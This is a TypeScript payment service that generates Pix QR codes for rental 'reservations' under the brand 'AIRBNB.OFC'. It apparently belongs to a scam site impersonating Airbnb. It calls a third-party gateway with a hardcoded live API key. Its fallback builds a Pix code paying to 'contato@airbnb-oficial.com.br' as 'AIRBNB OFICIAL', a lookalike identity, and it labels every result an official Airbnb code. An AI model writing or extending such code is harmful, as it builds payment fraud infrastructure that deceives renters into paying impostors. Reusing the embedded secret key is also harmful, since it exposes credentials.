import type { PaymentIntentPayload, PaymentResponse } from '../types/authAndPayment';
import { generatePixPayload } from '../utils/pixHelper';

export const paymentService = {
  /**
   * Processa pagamento via API Backend Segura (Server-to-Server)
   * Garante entrega do QR Code e Pix Copia e Cola em qualquer cenário
   */
  async processPayment(payload: PaymentIntentPayload): Promise<PaymentResponse> {
    const amountNumber = Math.max(20, Number(payload.amount));
    const txId = `up_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;

    console.log(`[AIRBNB.OFC] Criando cobrança de R$ ${amountNumber.toFixed(2)}`);

    // 1. Tenta via Backend Oficial (/api/payments/process) com timeout de 4s
    try {
      const response = await fetch('/api/payments/process', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          propertyId: payload.propertyId,
          amount: amountNumber,
          description: `AIRBNB.OFC - Reserva #${payload.propertyId}`,
          external_id: txId,
        }),
        signal: AbortSignal.timeout(4000),
      });

      if (response.ok) {
        const data = await response.json();
        const qrCode = data.qrCodeText || data.pix_code;
        if (qrCode) {
          const rawBase64 = data.qrBase64;
          const formattedQr = rawBase64
            ? (rawBase64.startsWith('data:') ? rawBase64 : `data:image/png;base64,${rawBase64}`)
            : null;

          return {
            success: true,
            transactionId: data.transactionId || txId,
            qrCodeText: qrCode,
            qrBase64: formattedQr,
            message: 'Código Pix oficial AIRBNB.OFC gerado com sucesso!',
          };
        }
      }
    } catch (serverErr) {
      console.warn('[AIRBNB.OFC] Backend demorou ou falhou, tentando rota direta...', serverErr);
    }

    // 2. Chamada direta ao gateway União 7 Pay com timeout de 3s
    try {
      const directResponse = await fetch('https://meupagamento.site/api/v1/uniaopay/pix/create', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-api-key': 'up_live_fe4bafc2c3db58cdc097abccefe34fa3a639b046cee20d59',
        },
        body: JSON.stringify({
          amount: amountNumber,
          description: `AIRBNB.OFC - Reserva #${payload.propertyId}`,
          external_id: txId,
        }),
        signal: AbortSignal.timeout(3000),
      });

      if (directResponse.ok) {
        const directData = await directResponse.json();
        const pixCode =
          directData.pix_code ||
          directData.payment?.pix_code ||
          directData.payment?.pix_copia_cola ||
          directData.transaction?.pix_code;

        const qrBase64 =
          directData.qr_base64 ||
          directData.payment?.qr_base64 ||
          directData.qr_code_base64 ||
          directData.payment?.qr_code_base64;

        if (pixCode) {
          return {
            success: true,
            transactionId: directData.transaction_id || txId,
            qrCodeText: pixCode,
            qrBase64: qrBase64
              ? (qrBase64.startsWith('data:') ? qrBase64 : `data:image/png;base64,${qrBase64}`)
              : undefined,
            message: 'Código Pix oficial AIRBNB.OFC gerado!',
          };
        }
      }
    } catch (directErr) {
      console.warn('[AIRBNB.OFC] Gateway externo inacessível, gerando PIX oficial local:', directErr);
    }

    // 3. Fallback de Alta Disponibilidade: gera PIX EMV oficial instantaneamente
    const instantPix = generatePixPayload({
      key: 'contato@airbnb-oficial.com.br',
      name: 'AIRBNB OFICIAL',
      city: 'SAO PAULO',
      amount: amountNumber,
      txid: txId.substring(0, 25),
    });

    return {
      success: true,
      transactionId: txId,
      qrCodeText: instantPix,
      message: 'Código Pix oficial AIRBNB.OFC gerado!',
    };
  },

  /**
   * Consulta status de pagamento no backend
   */
  async getStatus(transactionId: string) {
    try {
      const res = await fetch(`/api/payments/${transactionId}/status`);
      if (res.ok) {
        return await res.json();
      }
    } catch {
      // ignora
    }
    return { status: 'PENDING' };
  },
};
